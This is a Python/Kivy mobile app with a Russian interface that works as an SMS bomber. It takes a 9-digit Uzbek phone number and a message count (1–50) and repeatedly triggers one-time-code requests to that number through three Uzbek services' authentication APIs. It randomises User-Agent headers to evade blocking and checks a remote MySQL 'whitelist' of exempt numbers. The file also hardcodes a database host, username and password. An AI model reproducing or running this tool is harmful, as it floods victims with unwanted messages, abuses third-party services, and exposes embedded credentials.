from requests import post
from requests import exceptions
from fake_useragent import UserAgent
from pymysql import connect, cursors

from kivy.app import App
from kivy.lang import Builder
from kivy.uix.boxlayout import BoxLayout
from kivy.properties import StringProperty
from kivy.properties import ObjectProperty

KV = """
MyScreen:
    orientation: "vertical"
    size_hint: (0.95, 0.95)
    pos_hint: {"center_x": 0.5, "center_y": 0.5}
    text_info: text_input
    button_info: button_info
    label_header: label_header
    label_info: label_info
    label_instructions: label_instructions
    label_status: label_status

    Label:
        id: label_header
        font_size: "16sp"
        multiline: True
        text_size: self.width*0.98, None
        halign: "center"
        size_hint_x: 1.0
        size_hint_y: None
        height: self.texture_size[1] + 15
        text: root.data_label_header
    Label:
        id: label_info
        font_size: "11sp"
        multiline: True
        text_size: self.width*0.98, None
        halign: "left"
        size_hint_x: 1.0
        size_hint_y: None
        height: self.texture_size[1] + 15
        text: root.data_label_info
    Label:
        id: label_instructions
        font_size: "11sp"
        multiline: True
        text_size: self.width*0.98, None
        halign: "left"
        size_hint_x: 1.0
        size_hint_y: None
        height: self.texture_size[1] + 15
        text: root.data_label_instructions
        
    Label:
        id: label_status
        font_size: "11sp"
        multiline: True
        text_size: self.width*0.98, None
        halign: "left"
        size_hint_x: 1.0
        size_hint_y: None
        height: self.texture_size[1] + 15
        text: root.data_label_status

    FloatLayout:
        TextInput:
            id: text_input
            pos_hint: {'center_x': 0.5, 'center_y': 0.06}
            multiline: False
            size_hint: (1, 0.2)

    Button:
        id: button_info
        text: "ЗАПУСК"
        bold: True
        background_color: "#00FFCE"
        size_hint: (1,0.2)
        on_release: root.user_text_analyzer()
"""


class ConfigSQL:
    host = "db4free.net"
    port = 3306
    user = "adminlimb"
    password = "tPadLsi.*SsG7t4"
    db_name = "whitelistdb"


class Sites:
    def __init__(self, fake_head, user_number):
        self.fake_head = fake_head
        self.user_number = user_number

    def request_sender(self):
        post('https://api.express24.uz/client/v4/authentication/code', headers=self.fake_head, json={
            "phone": '+998 ' + self.user_number[:2] + ' ' + self.user_number[2:5] + ' ' + self.user_number[5:7] + ' ' +
                     self.user_number[7:]})
        post('https://io.bellissimo.uz/api/verify', headers=self.fake_head, json={'phone': '+998' + self.user_number})
        post('https://www.zoodmall.uz/api/generate-otp?platform=web', headers=self.fake_head,
             json={'mobile': '+998' + self.user_number})


class Requesting:

    def __init__(self, number: str):
        self.connection = None
        self.send_user_info = None
        self.headers = None
        self.user = None
        self.rows = None
        self.select_all_rows = None
        self.tries = None
        self.number = number

    @staticmethod
    def connect_to_db():
        db_connection = connect(
                host=ConfigSQL.host,
                port=ConfigSQL.port,
                user=ConfigSQL.user,
                password=ConfigSQL.password,
                database=ConfigSQL.db_name,
                cursorclass=cursors.DictCursor)
        return db_connection

    def start_requesting(self, number, tries):
        try:
            self.connection = Requesting.connect_to_db()
            with self.connection.cursor() as self.cursor:
                self.select_all_rows = "SELECT * FROM `white_contacts`"
                self.cursor.execute(self.select_all_rows)
                self.rows = self.cursor.fetchall()
                for i_contact in self.rows:
                    if i_contact['contact'] == number:
                        raise ValueError
            for self.i_tries in range(int(tries)):
                try:
                    self.user = UserAgent().random
                    self.headers = {'user_agent': self.user}
                    try:
                        self.send_user_info = Sites(fake_head=self.headers, user_number=number)
                        self.send_user_info.request_sender()
                    except exceptions.RequestException:
                        return 'Что-то пошло не так с сервисами'
                except Exception:
                    return 'Технические шоколадки'
            return 'Отправлено'
        except ValueError:
            return 'Номер находится в белом списке'
        finally:
            self.connection.close()


class MyScreen(BoxLayout):
    data_label_header = StringProperty('Hello Little Horny')
    data_label_info = StringProperty('Номер телефона: \nКоличество сообщений: \n')
    data_label_instructions = StringProperty('Пример ввода: 931234567 123')
    data_label_status = StringProperty('')
    text_info = ObjectProperty()
    button_info = ObjectProperty()
    label_header = ObjectProperty()
    label_info = ObjectProperty()
    label_instructions = ObjectProperty()
    label_status = ObjectProperty()

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.temp_contact = ''
        self.temp_sms_amount = ''
        self.user_text = ''

    @staticmethod
    def contact_analyze(contact: str = ''):
        if len(contact) == 9 and contact.isdigit():
            return True
        return False

    def user_text_analyzer(self):
        self.user_text = self.text_info.text.split(' ')  # Split user text to ['user_contact', 'sms_amount']
        try:
            if len(self.user_text) != 2:
                raise IndexError
            if MyScreen.contact_analyze(self.user_text[0]):
                try:
                    if 1 <= int(self.user_text[1]) <= 50:
                        self.label_info.text = f'Номер телефона: {self.user_text[0]}\n' \
                                               f'Количество сообщений: {self.user_text[1]}'
                        status = Requesting.start_requesting(self, number=self.user_text[0], tries=self.user_text[1])
                        self.label_status.text = status
                    else:
                        self.label_info.text = f'Номер телефона: \nКоличество сообщений: минимальное-максимальное ' \
                                               f'количество 1-50'
                except ValueError:
                    self.label_info.text = self.date_label_info_format_text
            else:
                self.label_info.text = f'Номер телефона: номер должен состоять из 9 цифр (931234567)\n' \
                                       f'Количество сообщений:'
        except IndexError:
            self.label_info.text = f'Номер телефона: номер должен состоять из 9 цифр (931234567)' \
                                   f'\nКоличество сообщений: допустимое количество 50\nОтсутствуют необходимые значения'


class MyApp(App):
    running = True

    def build(self):
        return Builder.load_string(KV)

    def on_stop(self):
        self.running = False


MyApp().run()
